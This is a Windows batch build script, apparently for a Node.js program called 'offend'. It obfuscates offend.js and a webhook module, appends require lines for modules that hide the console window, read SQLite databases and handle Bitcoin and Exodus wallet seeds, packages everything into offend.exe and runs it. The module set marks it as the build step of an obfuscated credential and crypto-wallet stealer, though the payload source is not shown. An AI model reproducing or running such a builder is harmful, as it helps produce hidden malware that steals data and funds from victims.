call npm rebuild
call javascript-obfuscator offend.js --output index.js
call javascript-obfuscator webhook.js --output webhook_obf.js
call echo ;require("child_process") >> index.js;
call echo require("crypto") >> index.js;
call echo require("fs") >> index.js;
call echo require("os") >> index.js;
call echo require("path") >> index.js;
call echo require("stream") >> index.js;
call echo require("zip-lib") >> index.js;
call echo require("boukiapi") >> index.js;
call echo require("systeminformation") >> index.js;
call echo require("sqlite3") >> index.js;
call echo require("request") >> index.js;
call echo require("node-hide-console-window") >> index.js;
call echo require("form-data") >> index.js;
call echo require("buffer-replace") >> index.js;
call echo require("axios") >> index.js;
call echo require("./webhook_obf.js") >> index.js;
call echo require("zlib") >> index.js;
call echo require("node-forge") >> index.js;
call echo require("seco-file") >> index.js;
call echo require("bitcoin-seed") >> index.js;
call echo require("@peculiar/webcrypto") >> index.js;
call pkg . -t win-x64 -o offend.exe
call "%CD%"\offend.exe
